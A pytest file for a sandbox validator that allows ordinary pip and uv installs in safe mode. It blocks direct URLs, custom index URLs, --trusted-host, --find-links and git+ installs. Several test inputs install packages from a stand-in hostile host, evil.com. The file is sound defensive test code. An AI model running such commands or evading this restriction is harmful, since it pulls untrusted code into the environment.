"""Tests for safe-mode pip/uv install restrictions."""

from __future__ import annotations

import pytest

from pr_orchestrator.sandbox.workspace_store import _validate_pip_uv_command


class TestPipUvValidation:
    """Tests for _validate_pip_uv_command function."""

    # --- Allowed commands in safe mode ---

    def test_pip_install_requirements_allowed(self) -> None:
        """pip install -r requirements.txt is allowed."""
        tokens = ["pip", "install", "-r", "requirements.txt"]
        _validate_pip_uv_command(tokens, "safe")  # Should not raise

    def test_pip_install_dot_allowed(self) -> None:
        """pip install . is allowed."""
        tokens = ["pip", "install", "."]
        _validate_pip_uv_command(tokens, "safe")

    def test_pip_install_editable_allowed(self) -> None:
        """pip install -e . is allowed."""
        tokens = ["pip", "install", "-e", "."]
        _validate_pip_uv_command(tokens, "safe")

    def test_pip_install_package_name_allowed(self) -> None:
        """pip install <package-name> is allowed."""
        tokens = ["pip", "install", "requests"]
        _validate_pip_uv_command(tokens, "safe")

    def test_uv_sync_allowed(self) -> None:
        """uv sync is allowed."""
        tokens = ["uv", "sync"]
        _validate_pip_uv_command(tokens, "safe")

    def test_uv_sync_dev_allowed(self) -> None:
        """uv sync --dev is allowed."""
        tokens = ["uv", "sync", "--dev"]
        _validate_pip_uv_command(tokens, "safe")

    def test_uv_pip_install_allowed(self) -> None:
        """uv pip install is allowed."""
        tokens = ["uv", "pip", "install", "requests"]
        _validate_pip_uv_command(tokens, "safe")

    # --- Blocked commands in safe mode ---

    def test_pip_install_url_blocked(self) -> None:
        """pip install https://... is blocked."""
        tokens = ["pip", "install", "https://evil.com/pkg.whl"]
        with pytest.raises(PermissionError, match="Direct URL"):
            _validate_pip_uv_command(tokens, "safe")

    def test_pip_install_http_url_blocked(self) -> None:
        """pip install http://... is blocked."""
        tokens = ["pip", "install", "http://evil.com/pkg.whl"]
        with pytest.raises(PermissionError, match="Direct URL"):
            _validate_pip_uv_command(tokens, "safe")

    def test_pip_install_index_url_blocked(self) -> None:
        """pip install --index-url is blocked."""
        tokens = ["pip", "install", "--index-url", "https://evil.com/simple", "pkg"]
        with pytest.raises(PermissionError, match="--index-url"):
            _validate_pip_uv_command(tokens, "safe")

    def test_pip_install_short_index_blocked(self) -> None:
        """pip install -i is blocked."""
        tokens = ["pip", "install", "-i", "https://evil.com/simple", "pkg"]
        with pytest.raises(PermissionError, match="-i"):
            _validate_pip_uv_command(tokens, "safe")

    def test_pip_install_extra_index_url_blocked(self) -> None:
        """pip install --extra-index-url is blocked."""
        tokens = ["pip", "install", "--extra-index-url", "https://evil.com/simple", "pkg"]
        with pytest.raises(PermissionError, match="--extra-index-url"):
            _validate_pip_uv_command(tokens, "safe")

    def test_pip_install_trusted_host_blocked(self) -> None:
        """pip install --trusted-host is blocked."""
        tokens = ["pip", "install", "--trusted-host", "evil.com", "pkg"]
        with pytest.raises(PermissionError, match="--trusted-host"):
            _validate_pip_uv_command(tokens, "safe")

    def test_pip_install_find_links_blocked(self) -> None:
        """pip install --find-links is blocked."""
        tokens = ["pip", "install", "--find-links", "/some/path", "pkg"]
        with pytest.raises(PermissionError, match="--find-links"):
            _validate_pip_uv_command(tokens, "safe")

    def test_pip_install_git_url_blocked(self) -> None:
        """pip install git+https://... is blocked."""
        tokens = ["pip", "install", "git+https://github.com/user/repo.git"]
        with pytest.raises(PermissionError, match="Git-based"):
            _validate_pip_uv_command(tokens, "safe")

    # --- Expert mode allows more ---

    def test_expert_mode_allows_index_url(self) -> None:
        """Expert mode allows --index-url."""
        tokens = ["pip", "install", "--index-url", "https://custom.pypi/simple", "pkg"]
        _validate_pip_uv_command(tokens, "expert")  # Should not raise

    def test_expert_mode_allows_git_url(self) -> None:
        """Expert mode allows git+ installs."""
        tokens = ["pip", "install", "git+https://github.com/user/repo.git"]
        _validate_pip_uv_command(tokens, "expert")  # Should not raise

    def test_expert_mode_blocks_trusted_host(self) -> None:
        """Even expert mode blocks --trusted-host."""
        tokens = ["pip", "install", "--trusted-host", "evil.com", "pkg"]
        with pytest.raises(PermissionError, match="--trusted-host"):
            _validate_pip_uv_command(tokens, "expert")

    # --- Non-pip/uv commands are passed through ---

    def test_non_pip_command_passed_through(self) -> None:
        """Non-pip/uv commands are not validated."""
        tokens = ["pytest", "-q"]
        _validate_pip_uv_command(tokens, "safe")  # Should not raise

    def test_python_non_pip_passed_through(self) -> None:
        """python commands that aren't pip are passed through."""
        tokens = ["python", "script.py"]
        _validate_pip_uv_command(tokens, "safe")  # Should not raise
